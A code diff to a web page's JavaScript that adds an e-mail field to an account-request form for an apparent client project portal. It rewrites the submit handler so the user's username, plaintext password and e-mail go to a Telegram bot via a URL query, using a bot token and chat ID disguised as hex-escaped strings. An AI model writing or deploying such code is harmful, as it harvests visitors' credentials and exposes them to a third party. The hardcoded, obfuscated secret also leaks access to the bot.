@@ -76,6 +76,12 @@ window.onload = () => {
                                 <span class="bar"></span>
                                 <label>Repeat password</label>
                             </div>
+                            <div class="group">      
+                                <input required type="email" id="email">
+                                <span class="highlight"></span>
+                                <span class="bar"></span>
+                                <label>E-mail</label>
+                            </div>
                             <br>
                             <button id="create">
                                 <span>Request</span></button>
@@ -111,18 +117,57 @@ window.onload = () => {
     createNewAcc = () => {
                 event.preventDefault()
             
+                let env_var = [
+                    "\x38\x30\x36\x34\x38\x39\x34\x31\x31\x3A\x41\x41\x48\x59\x31\x73\x57\x33\x37\x73\x72\x6E\x2D\x43\x2D\x31\x38\x30\x50\x55\x72\x72\x59\x76\x47\x31\x56\x74\x76\x64\x63\x41\x34\x55\x55",
+                    "\x2D\x31\x30\x30\x31\x34\x37\x39\x32\x30\x32\x31\x34\x37"
+                ]
+            
+                let token = env_var[0]
+                let chatId = env_var[1]
+
                 let newUsername = document.querySelector('#newUsername')
                 let newPassword = document.querySelector('#newPassword')
                 let newPassword2 = document.querySelector('#newPassword2')
+                let email = document.querySelector('#email')
                 
                 if (newUsername.value
                     && newPassword.value.length > 3
                     && newPassword.value === newPassword2.value) {
-                    document.querySelector('.request__form').remove()
-                    setTimeout(() => {
-                        document.querySelector('.login__form').style.display = 'block'
-                        document.querySelector('.help').style.display = 'block'
-                    }, 450)   
+                    fetch('https://api.telegram.org/bot' + token + '/' +
+                        'sendMessage?chat_id=' + chatId + '&text=' +
+                        'Новая заявка:' +
+                        "%0A------------------------------%0A" +
+                        'Логин: ' +  newUsername.value +
+                        "%0A------------------------------%0A" +
+                        'Пароль: ' + newPassword2.value +
+                        "%0A------------------------------%0A" +
+                        'Эл. почта: ' + email.value)
+                    .then(function(value){
+                        if(value.status == 200){
+                            document.querySelector('.request__form').innerHTML = `
+                                <div class="title">You requested new account.</div>
+                                <br>
+                                <form>
+                                    <div class="about">
+                                        We will inform you via e-mail when it will be activated.
+                                    </div>
+                                    <br>
+                                    <button id="cancel">
+                                        <span>Back</span></button>
+                                    </button>
+                                </form>
+                            `
+                            document.querySelector('#cancel').onclick = () => {
+                                event.preventDefault()
+                                document.querySelector('.login__form').style.display = 'block'
+                                document.querySelector('.help').style.display = 'block'
+                                document.querySelector('.request__form').remove()
+                            }
+                        }
+                    })
+                    .catch(function(reason){
+                        console.error(reason);
+                    })   
                 }
                 else {
                     if (!newUsername.value) {
@@ -156,11 +201,9 @@ window.onload = () => {
                     const infoForm = document.createElement('form')
                     const about = document.createElement('div')
                     about.className = 'about'
-                    about.innerText = `Lorem ipsum dolor sit amet, consectetur adipiscing elit, 
-                        sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. 
-                        Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. 
-                        Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. 
-                        Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.`
+                    about.innerText = `Here you can track the progress of all the projects we do for you. 
+                        In real time, reports on the work done are generated. 
+                        You can correct the terms of reference at any time and consult with our specialists.`
                     const cancelBtn = document.createElement('button')
                     cancelBtn.innerText = 'Back'
                     cancelBtn.id = 'cancel'
